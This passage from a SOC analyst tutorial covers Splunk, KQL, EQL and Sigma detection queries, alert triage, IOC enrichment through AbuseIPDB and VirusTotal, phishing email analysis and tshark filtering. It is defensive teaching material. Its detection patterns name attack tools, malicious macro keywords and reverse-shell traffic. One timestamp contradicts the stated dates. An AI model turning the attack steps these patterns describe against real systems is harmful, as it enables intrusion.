# => python-requests alone is ambiguous — used by both legitimate automation and attack tools
# => Combine with request pattern: /robots.txt first = reconnaissance step before deeper scan
# => Monitor subsequent requests from this IP for path enumeration or injection attempts

198.51.100.66 "GET /actuator/health HTTP/1.1" 200 42 "Go-http-client/1.1"
# => Go HTTP client — Spring Boot Actuator endpoint accessed (Java management interface)
# => /actuator/health is benign; /actuator/env or /actuator/heapdump would be critical
# => Automated probe of Actuator endpoints: check if /actuator/env was also accessed
```

**Key Takeaway:** sqlmap and Nikto user-agents are unambiguous attack indicators requiring
immediate response; curl and python-requests require context (source IP, request pattern, time of
day) to determine whether the activity is legitimate automation or an attack.

**Why It Matters:** Many mature web application attacks use tools that self-identify in their
user-agent strings, making them trivially detectable for analysts who know the signatures. Building
a user-agent blocklist covering common scanning tools and monitoring for new tool signatures in
production logs is a low-effort, high-value detection control that complements WAF rules.

---

## Example 13: Basic Splunk SPL Query — search, table, stats count by src_ip

**What this covers:** Splunk Processing Language (SPL) queries transform raw event data into
structured analysis. The three most fundamental SPL commands are `search` (filter events),
`table` (select fields to display), and `stats count by` (aggregate and group data). Combining
them produces the core query used in nearly every SOC investigation.

**Scenario:** You are building a Splunk query to find the top source IPs generating failed SSH
login attempts over the last 24 hours.

```splunk
| index=linux_auth sourcetype=auth_log "Failed password"
| # Filter events from the linux_auth index where the raw text contains "Failed password"
| # sourcetype=auth_log tells Splunk which field extractions to apply (sshd parsing)
| # This is the base search — all subsequent pipes refine this result set

| search src_ip=*
| # Ensure src_ip field is populated (filters out events where IP extraction failed)
| # Splunk extracts src_ip automatically from sshd log format via field extractions

| stats count AS failed_attempts BY src_ip
| # count: number of matching events per group
| # AS failed_attempts: rename the count column for readability in output
| # BY src_ip: group all events by unique source IP address

| sort -failed_attempts
| # Sort descending (- prefix) by failed_attempts — highest counts first
| # Top of the table = highest-priority IPs to investigate or block

| head 20
| # Return only the top 20 results (equivalent to SQL LIMIT 20)
| # Prevents overwhelming the analyst with hundreds of IPs

| table src_ip, failed_attempts
| # Display only these two columns in the output table
| # Cleaner than showing all 50+ extracted fields from the raw event
```

**Key Takeaway:** The `stats count by src_ip` pattern is the most reusable query primitive in SOC
work — once you can count events by any field, you can identify outliers across every log source.

**Why It Matters:** Raw log searches return thousands of individual events that are impossible to
triage manually. Aggregation with `stats count by` compresses those events into a ranked summary
that immediately surfaces the highest-volume actors. Every SOC analyst benefits from memorizing
the `search → stats → sort → head → table` pipeline as their default starting point for any
volumetric anomaly investigation.

---

## Example 14: Filtering by Time Range in Splunk — earliest= and latest= Operators

**What this covers:** Splunk's `earliest=` and `latest=` time range modifiers constrain searches to
specific windows relative to the current time or using absolute timestamps. Precise time scoping is
essential for incident investigations where you need to isolate events within a known attack window.

**Scenario:** An incident report states the compromise window is estimated between 2026-05-21
02:00 and 2026-05-21 05:00 UTC. You need to scope your Splunk searches to that window only.

```splunk
| index=windows_security EventCode=4624
| # Search Windows Security log for successful logon events (EventCode 4624)
| # Without time modifiers, Splunk uses the dashboard time picker (often "Last 24 hours")

| earliest="05/21/2026:02:00:00" latest="05/21/2026:05:00:00"
| # Absolute timestamp format: MM/DD/YYYY:HH:MM:SS (Splunk default)
| # earliest: start of window (inclusive) — 02:00 UTC on May 21
| # latest: end of window (inclusive) — 05:00 UTC on May 21
| # This scopes exactly to the known 3-hour incident window

| table _time, ComputerName, TargetUserName, LogonType, IpAddress
| # _time: event timestamp (Splunk's internal time field, always available)
| # ComputerName, TargetUserName, LogonType, IpAddress: key logon fields

---
| # Alternative: relative time modifiers (useful for recurring searches and alerts)

| index=linux_auth "Failed password" earliest=-1h@h latest=now
| # earliest=-1h@h: one hour ago, snapped to the start of the hour (e.g., 14:00 not 14:37)
| # latest=now: current time
| # @h snapping makes dashboards refresh cleanly at hour boundaries

| index=linux_auth "Failed password" earliest=-15m latest=now
| # Useful for near-real-time alert queries that run every 5 minutes in a scheduled search
| # 15-minute window with 5-minute schedule provides 10-minute overlap to catch late-arriving events

| index=firewall action=deny earliest=-24h@d latest=@d
| # @d: snap to start of day in the Splunk server's local timezone
| # -24h@d: yesterday's start; @d: today's start = exactly yesterday's firewall denies
```

**Key Takeaway:** Always scope incident investigation searches to the known attack window using
absolute timestamps — unconstrained searches waste query time and can include unrelated events
that mislead the investigation.

**Why It Matters:** Time scoping is both a performance and a correctness concern in SIEM
investigations. A search without proper time bounds on a large index can run for minutes and
return millions of irrelevant events. More critically, imprecise time scoping creates cognitive
bias — analysts may attribute pre-existing activity to the incident or miss the actual attack
window. Absolute timestamp scoping removes ambiguity from the investigation timeline.

---

## Example 15: Splunk stats and eval — Counting Failed Logins per User and Thresholding

**What this covers:** Combining `stats count by` with `eval` and `where` allows analysts to
apply arithmetic thresholds to aggregated data — for example, finding only users with more than
10 failed logins in an hour. This is the basis for building detection logic in Splunk alerting.

**Scenario:** You are writing a saved search that will alert when any user account has more than
10 failed Windows logons in a 60-minute window — the threshold for a likely brute-force or
credential stuffing attack.

```splunk
| index=windows_security EventCode=4625 earliest=-60m latest=now
| # EventCode 4625 = Failed logon event on Windows
| # Time window: last 60 minutes (used in a scheduled alert that runs every 15 minutes)

| stats count AS failed_count, values(IpAddress) AS source_ips, values(WorkstationName) AS workstations
    BY TargetUserName
| # count: number of failed logon events per user
| # values(IpAddress): collect all unique IPs that attempted this user's account (may be 1 or many)
| # values(WorkstationName): collect all source workstation names
| # BY TargetUserName: one row per username in the output

| eval is_brute_force = if(failed_count > 10, "YES", "NO")
| # eval creates a new field "is_brute_force" using an if() expression
| # if(condition, true_value, false_value): analogous to a ternary operator
| # This labels each row without filtering — keeps full context for review

| eval risk_score = case(
    failed_count > 50, "CRITICAL",
    failed_count > 20, "HIGH",
    failed_count > 10, "MEDIUM",
    true(), "LOW"
  )
| # case() assigns a tiered risk score based on failure count
| # true() acts as the else/default branch — always matches if no prior condition did
| # This output field drives alert priority routing in the SOAR platform

| where is_brute_force = "YES"
| # Filter to only rows where brute force threshold is exceeded
| # where operates on computed fields (unlike search, which works on raw text)

| table TargetUserName, failed_count, risk_score, source_ips, workstations
| sort -failed_count
| # Final output: sorted by severity, ready for analyst triage
```

**Key Takeaway:** The `stats → eval → where` pipeline transforms raw event counts into
prioritized, risk-scored alerts that your SOAR or ticketing system can ingest without manual
triage of individual events.

**Why It Matters:** Building thresholded detection searches is the bridge between raw log analysis
and automated alerting. Every Splunk alert in a SOC is ultimately a search that applies this
pattern — count events, apply a threshold, surface only the cases exceeding that threshold. Analysts
who understand this pipeline can build and tune detection rules themselves rather than waiting weeks
for engineering resources to implement alerts.

---

## Example 16: Basic Elastic KQL Query — Filtering by event.code and host.name

**What this covers:** Kibana Query Language (KQL) is the search syntax used in Elastic SIEM and
Kibana Discover. KQL uses field:value syntax for exact matches, wildcards with `*`, and boolean
operators (`and`, `or`, `not`). It is simpler than Lucene query syntax but sufficient for most
Tier 1 and Tier 2 SIEM investigations.

**Scenario:** You are a SOC analyst using Elastic SIEM to investigate suspicious logon activity
on a specific Windows host during a known incident window.

```kql
// KQL query — Basic event filtering
// Note: KQL does not use | pipes; it is a filter expression evaluated against the index

event.code: "4625" and host.name: "WKS-FIN-017"
// event.code: "4625" — filters to Windows failed logon events only
// and: both conditions must be true (boolean AND)
// host.name: "WKS-FIN-017" — restrict to a specific endpoint being investigated

---

// Extended query: multiple Event IDs with OR, and time-bounded in the Kibana time picker
// (Time range set to 2026-05-21 02:00 – 05:00 UTC in the Kibana date picker UI)

event.code: ("4624" or "4625") and host.name: "WKS-FIN-017" and source.ip: *
// event.code: ("4624" or "4625") — match either successful (4624) or failed (4625) logon
// Parentheses group the OR — without them, operator precedence may produce unexpected results
// source.ip: * — require the source.ip field to exist (non-null), filters out local logons

---

// Wildcard query: find all hosts in a subnet range
// Note: KQL does not support CIDR notation directly — use wildcard on the string representation

source.ip: "10.0.1.*" and event.category: "authentication"
// source.ip: "10.0.1.*" — wildcard matches any IP starting with 10.0.1.
// event.category: "authentication" — ECS (Elastic Common Schema) normalized category field
// ECS normalization means this works across Windows, Linux, and cloud log sources

---

// NOT operator: exclude known-good administrative IPs

event.code: "4625" and not source.ip: ("10.x.0.1" or "10.x.0.2")
// not source.ip: (...) — exclude the two known jump server IPs from the results
// This reduces false positives from automated monitoring tools that generate expected failures
```

**Key Takeaway:** KQL's `field: value and field: value` syntax is readable enough for analysts to
write ad-hoc queries in minutes, but precision matters — always use `event.code` (ECS) over raw
`message` text matching to ensure queries are portable across log sources.

**Why It Matters:** Elastic SIEM is widely deployed, and KQL fluency directly determines how
quickly an analyst can pivot from alert to investigation context. Unlike Splunk SPL, KQL is a pure
filter expression — simpler to learn but also less powerful for aggregation. Understanding when to
use KQL (discovery and filtering) versus EQL or Lens (aggregation and sequencing) is a key skill
for Elastic SIEM practitioners.

---

## Example 17: Elastic EQL Sequence Query — Detecting Process Launch Followed by Network Connection

**What this covers:** Event Query Language (EQL) extends Elastic with sequence detection —
the ability to match multiple events in a defined order within a time window. Sequences are
essential for detecting multi-step attack techniques where a single event is not conclusive
but a series of events together indicates compromise.

**Scenario:** You are a detection engineer writing an EQL rule to detect the pattern of a
PowerShell process being launched by a non-shell parent process, followed by that PowerShell
process making a network connection — a common pattern for fileless malware loaders.

```kql
// EQL Sequence Query — Elastic Event Query Language
// Detects: Office/PDF app spawns PowerShell → PowerShell makes network connection
// This two-event sequence is a strong indicator of macro-based or phishing-delivered malware

sequence by host.name with maxspan=2m
  // sequence: match events IN ORDER (event 1 must precede event 2)
  // by host.name: the sequence must occur on the SAME host
  // maxspan=2m: both events must occur within 2 minutes of each other

  [process where event.type == "start"
   and process.name : "powershell.exe"
   and process.parent.name : ("WINWORD.EXE", "EXCEL.EXE", "OUTLOOK.EXE", "AcroRd32.exe", "mshta.exe")]
  // First event: a process start event where:
  // - the new process is powershell.exe
  // - the parent process is a common phishing delivery vehicle (Office apps, PDF reader, mshta)
  // process.name : uses case-insensitive wildcard matching in EQL

  [network where event.type == "connection"
   and process.name : "powershell.exe"
   and not destination.ip : ("127.0.0.1", "::1", "10.0.0.0/8", "192.168.0.0/16", "172.16.0.0/12")]
  // Second event: a network connection event where:
  // - the connecting process is powershell.exe (same process, same host — enforced by sequence)
  // - destination is NOT a loopback or RFC 1918 private address (external C2 connection)
  // not destination.ip with CIDR blocks excludes benign internal update connections
```

**Key Takeaway:** EQL sequence detection eliminates most false positives that individual
event-based rules generate — Office spawning PowerShell alone might have legitimate uses, but
Office spawning PowerShell that then calls home externally within two minutes almost never does.

**Why It Matters:** Single-event detection rules have high false positive rates in environments
where PowerShell is legitimately used for administration. EQL sequence correlation allows analysts
to express the full attack chain — not just one step — as a detection condition, dramatically
improving signal-to-noise ratio. This approach directly enables the SOC to catch living-off-the-land
techniques that evade signature-based endpoint tools.

---

## Example 18: Writing a Basic Sigma Rule — Brute-Force Detection in YAML Format

**What this covers:** Sigma is a vendor-neutral detection rule format that describes event
patterns in YAML and converts to SIEM-specific queries (Splunk SPL, Elastic KQL, Microsoft
Sentinel KQL) via converter tools. Writing Sigma rules allows detection engineers to maintain
a single detection library usable across any SIEM platform.

**Scenario:** You are writing a Sigma rule to detect SSH brute-force attacks on Linux hosts,
defined as more than 10 failed password attempts from a single source IP within 60 seconds.

```yaml
# Sigma rule — SSH brute-force detection
# File: rules/linux/auth/ssh_brute_force.yml

title: SSH Brute Force Login Attempt
# title: human-readable name for the detection; appears in SIEM alert titles

id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
# id: unique UUID v4 for this rule; stable identifier used for rule management and suppression

status: stable
# status: draft | test | stable | deprecated
# stable = rule has been validated in production and has acceptable false-positive rate

description: |
  Detects multiple failed SSH authentication attempts from a single source IP in a short
  time window, indicating a brute-force or credential stuffing attack against SSH service.
# description: explains what the rule detects and why it fires
references:
  - https://attack.mitre.org/techniques/T1110/001/
# references: links to MITRE ATT&CK, CVEs, or threat intel reports that inform this detection
# T1110.001 = Brute Force: Password Guessing

author: soc-team@corp.example.com
date: 2026-05-21
# date: creation or last modification date (ISO 8601 format)

tags:
  - attack.credential_access # MITRE ATT&CK tactic
  - attack.t1110.001 # MITRE ATT&CK technique: Brute Force - Password Guessing
# tags: structured taxonomy for grouping and filtering rules

logsource:
  product: linux
  service: auth
  # logsource: tells the converter which log source to query
  # product: linux → /var/log/auth.log or /var/log/secure depending on distro
  # service: auth → Sigma knows to look for sshd-generated authentication events

detection:
  keywords:
    - "Failed password"
  # keywords: raw text patterns to match in the log message field
  # Sigma will generate a full-text search or message field match in the target SIEM

  filter_invalid:
    message|contains: "invalid user"
  # filter_invalid: optional sub-section for exclusions (reduces false positives)
  # This filter suppresses "invalid user" events (non-existent accounts) from the count
  # Rationale: real brute-force against valid accounts is higher priority

  condition: keywords and not filter_invalid
  # condition: boolean expression combining detection sections
  # "keywords and not filter_invalid" = match "Failed password" but not "invalid user"

aggregation:
  function: count()
  groupby:
    - src_ip
  timewindow: 60s
  condition: "> 10"
# aggregation: threshold-based detection (not all SIEMs support this natively from Sigma)
# count() more than 10 events grouped by src_ip within 60 seconds

falsepositives:
  - Legitimate automated tools (e.g., monitoring systems testing SSH connectivity)
  - Password rotation scripts that have misconfigured credentials
# falsepositives: document known benign triggers so analysts can tune suppressions

level: medium
# level: informational | low | medium | high | critical
# medium: warrants investigation but not immediate paging; escalate if volume is high
```

**Key Takeaway:** A Sigma rule's `logsource` + `detection` + `condition` trio is the minimum
viable structure — the `aggregation` block makes it threshold-based rather than single-event,
which is essential for volumetric attacks like brute-force.

**Why It Matters:** Sigma rules allow a detection engineer to write a brute-force rule once and
deploy it to Splunk, Elastic, Microsoft Sentinel, and QRadar without rewriting. In organizations
that run multiple SIEMs or plan migrations, Sigma-first detection libraries dramatically reduce
maintenance overhead. Understanding Sigma syntax also makes it easier to consume threat
intelligence feeds that publish detection content in Sigma format.

---

## Example 19: Alert Triage Workflow — Acknowledge, Enrich, Escalate vs. Close

**What this covers:** Alert triage is the structured process a Tier 1 SOC analyst follows when
a SIEM or endpoint tool generates an alert. The workflow has four stages: acknowledge (claim the
alert), enrich (gather context), decide (escalate to Tier 2 or close as false positive), and
document (record findings in the ticket). Following a consistent workflow prevents both missed
incidents and false-positive overload.

**Scenario:** Your SIEM fires an alert titled "SSH Brute Force — High Volume Failures from
External IP" for source IP 203.0.113.77 targeting db-prod-01.

```bash
# Alert Triage Workflow — annotated step-by-step procedure
# Tool: SOAR/ticketing system + threat intelligence platform + SIEM

# STEP 1: ACKNOWLEDGE — claim the alert to prevent duplicate triage
# => Open the alert in the SOAR platform and assign it to yourself
# => Set status from "New" to "In Progress"
# => Record start time: 2026-05-21 09:14 UTC

# STEP 2: ENRICH — gather context before making a decision

# 2a. Confirm the alert data (never trust the alert summary alone — verify raw logs)
# SIEM query to confirm:
# index=linux_auth src_ip=203.0.113.77 "Failed password" earliest=-1h
# => 47 failures confirmed from 203.0.113.77 in past 60 minutes
# => All targeting db-prod-01; no successful logins observed

# 2b. IP reputation check (see Example 20 for detailed lookup workflow)
curl -s "https://api.abuseipdb.com/api/v2/check?ipAddress=203.0.113.77&maxAgeInDays=90" \
  -H "Key: $ABUSEIPDB_API_KEY" \
  -H "Accept: application/json" | jq '.data | {abuseScore: .abuseConfidenceScore, country: .countryCode, isp: .isp}'
# => Output: {"abuseScore": 95, "country": "CN", "isp": "Shenzhen Hosting Ltd"}
# => abuseScore 95/100 — this IP is widely reported as malicious                (high confidence)

# 2c. Check whether any SSH login succeeded from this IP
grep "Accepted" /var/log/auth.log | grep "203.0.113.77"
# => No output — zero successful logins from this IP
# => No successful login = attack did not succeed (so far)

# 2d. Verify the target host's exposure
nmap -sV --open -p 22 db-prod-01.corp.example.com 2>/dev/null | grep "22/tcp"
# => 22/tcp  open  ssh  OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
# => SSH is Internet-exposed on this DB server — this is a configuration risk
# => DB servers should not have SSH open to the Internet (firewall gap finding)

# STEP 3: DECIDE — escalate or close

# Decision criteria:
# [x] Confirmed brute-force from known malicious IP: YES → escalate
# [x] Any successful login: NO → reduces urgency but does not close
# [x] Target is a production DB server: YES → escalates severity
# [x] SSH exposed to Internet on a DB server: YES → additional finding to document

# Decision: ESCALATE to Tier 2 with recommendation to:
# 1. Block 203.0.113.77 at the perimeter firewall
# 2. Review whether SSH on db-prod-01 should be Internet-accessible (it should not be)
# 3. Enable fail2ban or firewalld rate limiting on db-prod-01

# STEP 4: DOCUMENT — record findings in the incident ticket
# Ticket fields (see Example 28 for full incident ticket template)
# - Summary: SSH brute force from high-reputation-malicious IP 203.0.113.77
# - Severity: Medium (no successful login, but DB server exposure is HIGH risk)
# - Evidence: 47 failures in 60 min; AbuseIPDB score 95; no successful auth
# - Recommended Action: block IP, remediate SSH exposure, enable rate limiting
```

**Key Takeaway:** Never close an alert as false positive based solely on "no successful login" —
the attack surface finding (Internet-exposed SSH on a DB server) is a separate HIGH-severity
finding that requires a remediation ticket regardless of the brute-force outcome.

**Why It Matters:** Inconsistent alert triage is the root cause of both analyst burnout (closing
real threats as false positives) and missed incidents (escalating false positives without enrichment,
training the team to ignore alerts). A documented four-step triage workflow transforms alert
handling from reactive guessing into a repeatable, auditable process that meets compliance and
incident response requirements.

---

## Example 20: IP Reputation Lookup — AbuseIPDB CLI and VirusTotal API for IOC Enrichment

**What this covers:** Threat intelligence enrichment adds context to raw IOCs (indicators of
compromise) found in logs by querying reputation databases. AbuseIPDB provides crowd-sourced
IP abuse reports; VirusTotal aggregates results from 70+ antivirus engines and URL scanners.
Both offer free API tiers suitable for on-demand SOC enrichment.

**Scenario:** During incident triage, you have collected two IOCs: a source IP address
(198.51.100.200) and a domain (update.malicious-cdn.example) that appeared in PowerShell logs.

```bash
# IOC ENRICHMENT — AbuseIPDB API (IP address lookup)
# Requires: ABUSEIPDB_API_KEY environment variable set from your API key

SUSPECT_IP="198.51.100.200"
# => Define the IP to query — replace with actual suspect IP from incident

curl -s "https://api.abuseipdb.com/api/v2/check" \
  --data-urlencode "ipAddress=${SUSPECT_IP}" \
  --data-urlencode "maxAgeInDays=90" \
  --data-urlencode "verbose" \
  -H "Key: ${ABUSEIPDB_API_KEY}" \
  -H "Accept: application/json" \
  | jq '{
      ip: .data.ipAddress,
      score: .data.abuseConfidenceScore,
      country: .data.countryCode,
      isp: .data.isp,
      domain: .data.domain,
      usageType: .data.usageType,
      total_reports: .data.totalReports,
      last_reported: .data.lastReportedAt
    }'
# => jq extracts only the relevant fields from the full JSON response
# => score: 0-100 confidence that the IP is abusive (>85 = block; >50 = investigate)
# => usageType: "Data Center/Web Hosting" is common for attack infrastructure
# => last_reported: if recent (< 7 days), threat is active

# Sample output (fictional):
# {
#   "ip": "198.51.100.200",
#   "score": 87,                  # => High confidence malicious
#   "country": "RU",              # => Russia (geolocation, not proof of attacker nationality)
#   "isp": "AS12345 FastHost LLC", # => VPS/hosting ISP — common for rented attack infra
#   "usageType": "Data Center/Web Hosting",
#   "total_reports": 234,         # => 234 separate abuse reports — well-established bad actor
#   "last_reported": "2026-05-20T18:34:00+00:00"  # => Reported yesterday — active threat
# }

# ---

# IOC ENRICHMENT — VirusTotal API (domain/URL lookup)
# Requires: VT_API_KEY environment variable from your VirusTotal API key

SUSPECT_DOMAIN="update.malicious-cdn.example"
# => The domain found in PowerShell command-line logs

# VirusTotal domain lookup — base64-encode the domain for the API URL path
ENCODED=$(printf '%s' "${SUSPECT_DOMAIN}" | base64 | tr '+/' '-_' | tr -d '=')
# => VirusTotal API v3 encodes identifiers as URL-safe base64

curl -s "https://www.virustotal.com/api/v3/domains/${ENCODED}" \
  -H "x-apikey: ${VT_API_KEY}" \
  | jq '{
      domain: .data.id,
      malicious: .data.attributes.last_analysis_stats.malicious,
      suspicious: .data.attributes.last_analysis_stats.suspicious,
      harmless: .data.attributes.last_analysis_stats.harmless,
      categories: .data.attributes.categories,
      creation_date: .data.attributes.creation_date
    }'
# => malicious: number of VT engines that flagged this domain as malicious (out of ~90)
# => suspicious: engines flagging as suspicious (lower confidence)
# => categories: how the domain is classified (e.g., "malware", "command-and-control")
# => creation_date: recently registered domains (< 30 days) with malicious flags = high risk
```

**Key Takeaway:** An AbuseIPDB score above 85 combined with a VirusTotal malicious detection
count above 10 engines provides enough confidence to escalate immediately and block the IOC
without waiting for additional investigation.

**Why It Matters:** Manual threat intelligence lookups are the difference between a 5-minute
triage and a 30-minute investigation. Every SOC analyst should be able to query AbuseIPDB,
VirusTotal, and Shodan from the command line using pre-configured API keys. Automating these
lookups in your SOAR platform reduces triage time further, but the manual skill is essential
for investigations that fall outside automated enrichment coverage.

---

## Example 21: Extracting IOCs from a Suspicious Email — Headers, Links, and Attachments

**What this covers:** Phishing emails are one of the most common initial access vectors. Extracting
IOCs from a suspicious email means parsing the email headers (true sender, relay path), URLs in
the body (phishing landing pages, malware downloads), and attachment metadata (hash, filetype,
embedded macros) to build a complete picture of the attack and block the infrastructure.

**Scenario:** A user forwards a suspicious email claiming to be from payroll. You are extracting
IOCs to share with the threat intel team and block at the email gateway.

```bash
# SUSPICIOUS EMAIL IOC EXTRACTION
# Assume the email has been exported as .eml file to /tmp/suspicious_payroll.eml

# STEP 1: Extract email headers — trace the true sender path
grep -E "^(Received|From|Reply-To|Return-Path|X-Originating-IP|Message-ID|Subject):" \
  /tmp/suspicious_payroll.eml | head -30
# => Received: headers show the relay path in reverse chronological order (last hop first)
# => The LAST Received: header in the chain is where the email entered the Internet
# => From: may be spoofed; Return-Path: and the last Received: from IP reveal the true sender

# Expected output (fictional):
# Return-Path: <noreply@evil-mailer.example>          # => Actual bounce address (not payroll)
# Received: from mail.evil-mailer.example (203.0.113.250)  # => Sending mail server IP
# From: "Payroll Department" <payroll@corp-legit.example>  # => Spoofed display name
# Reply-To: attacker@gmail.com                         # => Replies go to attacker (not payroll)
# Subject: ACTION REQUIRED: Update your bank details before Friday

# STEP 2: Extract URLs from the email body
grep -oE 'https?://[^ "<>]+' /tmp/suspicious_payroll.eml | sort -u
# => -oE: print only the matching portion (not the entire line)
# => Pattern matches http:// or https:// followed by non-whitespace/quote characters
# => sort -u: deduplicate URLs

# Expected output:
# https://corp-legit-update.evil-mailer.example/payroll/update-banking
# => URL uses a domain SIMILAR to the company name (typosquat or homograph attack)
# => Path "/payroll/update-banking" is social engineering bait
# => DO NOT click — pass to VirusTotal for analysis (see Example 22)

# STEP 3: Extract attachment metadata without executing it
# Assuming the email has a .docx attachment extracted to /tmp/payroll_update.docx

file /tmp/payroll_update.docx
# => payroll_update.docx: Microsoft Word 2007+ (ZIP-based OOXML format)

sha256sum /tmp/payroll_update.docx
# => d4e5f6a7b8c9... payroll_update.docx
# => SHA256 hash: submit to VirusTotal (Example 22) for reputation check

# Check for VBA macros (macros = primary malware delivery mechanism in Office files)
olevba /tmp/payroll_update.docx 2>/dev/null | grep -E "(AutoOpen|AutoClose|Shell|WScript|PowerShell|http)"
# => olevba is part of oletools (pip install oletools)
# => AutoOpen/AutoClose: macros that run automatically when the document opens
# => Shell, WScript, PowerShell: macro executing system commands = almost certainly malicious
# => http: macro downloading additional payload from C2 server
```

**Key Takeaway:** The true sender is revealed by the last `Received:` header and `Return-Path:`,
not the `From:` display name — treat any mismatch between these as a phishing indicator requiring
immediate investigation.

**Why It Matters:** Phishing triage is a core Tier 1 SOC competency. Organizations that cannot
extract and act on phishing IOCs quickly suffer repeated attacks from the same infrastructure.
Blocking the sending IP, phishing URL, and attachment hash at the email gateway within minutes of
the first report prevents the same lure from reaching other users and limits initial access to
the single user who reported it.

---

## Example 22: Checking a File Hash Against VirusTotal — curl API Request Annotated

**What this covers:** VirusTotal's file hash lookup allows analysts to check whether a file has
been previously submitted to VirusTotal and flagged by any of its 70+ antivirus and threat
intelligence engines. A SHA256 hash lookup takes seconds and requires no file upload — only
the hash — making it safe even for sensitive environments.

**Scenario:** During malware triage on a compromised host, you found a suspicious executable at
`C:\Users\bwilson\AppData\Local\Temp\svchost32.exe`. You extract its hash and check VirusTotal.

```bash
# FILE HASH LOOKUP — VirusTotal API v3
# Requires: VT_API_KEY environment variable (free tier: 500 lookups/day)

# Step 1: compute the hash (Linux — on Windows use certutil or PowerShell Get-FileHash)
sha256sum /evidence/svchost32.exe
# => 3a4b5c6d7e8f9012345678901234567890abcdef1234567890abcdef12345678  svchost32.exe
# => Always use SHA256 — MD5 and SHA1 have collision vulnerabilities

FILE_HASH="3a4b5c6d7e8f9012345678901234567890abcdef1234567890abcdef12345678"
# => Store the hash in a variable for reuse

# Step 2: query VirusTotal
curl -s "https://www.virustotal.com/api/v3/files/${FILE_HASH}" \
  -H "x-apikey: ${VT_API_KEY}" \
  | jq '{
      name: .data.attributes.meaningful_name,
      type: .data.attributes.type_description,
      size: .data.attributes.size,
      malicious: .data.attributes.last_analysis_stats.malicious,
      undetected: .data.attributes.last_analysis_stats.undetected,
      first_submitted: .data.attributes.first_submission_date,
      last_analysis_date: .data.attributes.last_analysis_date,
      threat_label: .data.attributes.popular_threat_label,
      tags: .data.attributes.tags
    }'
# => meaningful_name: the most common filename this hash is seen as in VT submissions
# => malicious: count of engines flagging this file (>5 = highly suspicious; >30 = confirmed malware)
# => undetected: engines that cleared it (a low malicious + high undetected = possible new sample)
# => first_submitted: when first seen in VT; very recent = potentially zero-day or targeted
# => popular_threat_label: VT's consensus malware family name (e.g., "trojan.genericbackdoor")
# => tags: behavioral tags added by sandbox analysis (e.g., "spreads-files", "powershell")

# Sample output (fictional — high-confidence malware):
# {
#   "name": "svchost32.exe",
#   "type": "Win32 EXE",
#   "size": 245760,
#   "malicious": 58,              # => 58 of ~70 engines flagged this — confirmed malware
#   "undetected": 7,              # => 7 engines missed it (evasion or lag in signature updates)
#   "first_submitted": 1716220800, # => 2024-05-20 (first seen yesterday — recent campaign)
#   "threat_label": "trojan.agent/asyncrat",  # => AsyncRAT remote access trojan
#   "tags": ["rat", "persistence", "network"]
# }
# => AsyncRAT: open-source remote access trojan with keylogging and reverse shell capabilities
# => Immediate actions: isolate the host, preserve memory dump, initiate IR playbook for RAT

# Step 3: if hash NOT found in VT (404 response), the file is potentially a targeted/novel sample
# => 404 from VT does NOT mean the file is safe — it means VT has not seen it yet
# => Consider submitting the file to VT sandbox (only if legal and approved for your organization)
# => Alternatively, use an offline sandbox (e.g., Cuckoo, Any.run with network isolation)
```

**Key Takeaway:** A 404 (hash not found) from VirusTotal on a file behaving suspiciously should
increase suspicion, not decrease it — novel malware designed for targeted attacks deliberately
avoids public submission to stay off VT.

**Why It Matters:** VirusTotal hash lookup is the fastest single enrichment action available to
a SOC analyst. The 10-second API call can immediately confirm whether a suspicious file is a
known malware family (enabling faster playbook selection) or an unknown sample (signaling the
need for sandbox analysis and threat intelligence escalation). Building this into every malware
triage workflow saves hours of manual analysis for known threats.

---

## Example 23: Basic Network Traffic Analysis with tshark — Display Filters Annotated

**What this covers:** `tshark` is the command-line version of Wireshark, allowing analysts to
capture and analyze network packet captures (PCAPs) without a GUI. Display filters in tshark
use the same Wireshark filter syntax and allow precise filtering by protocol, IP, port, and
payload content — essential for network-level incident investigation.

**Scenario:** You have a PCAP file from a network tap during an incident and need to identify
suspicious outbound connections and any cleartext credential data in the capture.

```bash
# tshark — Wireshark command-line PCAP analysis
# Assume pcap is at /evidence/incident_20260521.pcap

# STEP 1: Overview — what hosts and protocols are in this capture?
tshark -r /evidence/incident_20260521.pcap \
  -q -z "conv,ip"
# => -r: read from file (no live capture)
# => -q: quiet mode (suppress per-packet output; show only the statistics at the end)
# => -z "conv,ip": display IP conversation statistics (source IP, dest IP, packet count, bytes)
# => Output shows which IP pairs communicated most — quickly surfaces C2 connections

# STEP 2: Filter HTTP traffic and display method, host, and URI
tshark -r /evidence/incident_20260521.pcap \
  -Y "http.request" \
  -T fields -e ip.src -e http.host -e http.request.method -e http.request.uri \
  2>/dev/null | sort | uniq -c | sort -rn | head 20
# => -Y "http.request": display filter for HTTP request packets only
# => -T fields: output only specified fields (not full packet decode)
# => -e ip.src, http.host, etc.: the specific fields to output (tab-separated)
# => uniq -c | sort -rn: count identical rows and sort by frequency (detect repeated C2 beaconing)

# STEP 3: Look for cleartext credentials (HTTP Basic Auth or FTP)
tshark -r /evidence/incident_20260521.pcap \
  -Y "http.authorization or ftp.request.command == PASS" \
  -T fields -e ip.src -e ip.dst -e http.authorization -e ftp.request.arg \
  2>/dev/null
# => http.authorization: HTTP Basic Auth header contains base64-encoded username:password
# => ftp.request.command == PASS: FTP password command (cleartext in FTP)
# => If output is non-empty: credentials were transmitted in cleartext — HIGH finding

# STEP 4: Find DNS queries to suspicious domains (example: non-RFC1918 DNS resolvers)
tshark -r /evidence/incident_20260521.pcap \
  -Y "dns.flags.response == 0 and not ip.dst == 10.x.0.1" \
  -T fields -e ip.src -e ip.dst -e dns.qry.name \
  2>/dev/null
# => dns.flags.response == 0: DNS queries only (not responses)
# => not ip.dst == 10.x.0.1: exclude queries to the internal DNS server (10.x.0.1)
# => Non-internal DNS destination = host using external DNS resolver or DNS tunneling

# STEP 5: Extract TCP streams for manual inspection of a suspicious conversation
tshark -r /evidence/incident_20260521.pcap \
  -Y "ip.addr == 203.0.113.99 and tcp.port == 4444" \
  -z "follow,tcp,ascii,0" \
  2>/dev/null | head 50
# => Filter to packets involving the suspect IP on port 4444 (common reverse shell port)
# => -z "follow,tcp,ascii,0": reconstruct TCP stream 0 as ASCII text
# => Port 4444 with printable ASCII content is consistent with a reverse shell session
```

**Key Takeaway:** The `tshark -Y <filter> -T fields -e field1 -e field2` pattern is the fastest
way to extract specific data from a PCAP at the command line — combine it with `sort | uniq -c |
sort -rn` to rank frequency and surface anomalies instantly.

**Why It Matters:** Network packet capture analysis is irreplaceable for incidents where endpoint
